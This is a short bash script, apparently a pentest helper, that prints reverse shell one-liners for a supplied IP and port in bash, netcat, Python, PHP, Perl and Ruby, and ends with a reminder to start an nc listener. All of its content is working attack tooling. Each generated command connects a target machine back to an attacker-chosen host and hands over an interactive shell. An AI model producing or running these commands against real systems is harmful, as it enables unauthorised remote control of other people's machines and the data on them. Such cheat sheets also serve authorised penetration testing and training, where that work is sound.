#!/bin/bash -ex
# Reverse Shell Generator
# Usage: ./revshell.sh <local_ip> <local_port> [shell_type]

set -e

if [ $# -lt 2 ]; then
    echo "Usage: $0 <local_ip> <local_port> [shell_type]"
    echo "Shell types: bash, nc, python, php, perl, ruby"
    echo "Example: $0 192.168.1.100 4444 bash"
    exit 1
fi

LHOST=$1
LPORT=$2
SHELL_TYPE=${3:-"bash"}

echo "Generating reverse shell for $LHOST:$LPORT ($SHELL_TYPE)"

case $SHELL_TYPE in
    "bash")
        echo "Bash reverse shell:"
        echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
        ;;
    "nc"|"netcat")
        echo "Netcat reverse shell:"
        echo "nc -e /bin/sh $LHOST $LPORT"
        echo "Alternative: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
        ;;
    "python")
        echo "Python reverse shell:"
        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ;;
    "php")
        echo "PHP reverse shell:"
        echo "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ;;
    "perl")
        echo "Perl reverse shell:"
        echo "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        ;;
    "ruby")
        echo "Ruby reverse shell:"
        echo "ruby -rsocket -e'f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ;;
    *)
        echo "Unknown shell type: $SHELL_TYPE"
        echo "Available types: bash, nc, python, php, perl, ruby"
        exit 1
        ;;
esac

echo ""
echo "Don't forget to set up a listener:"
echo "nc -lvnp $LPORT"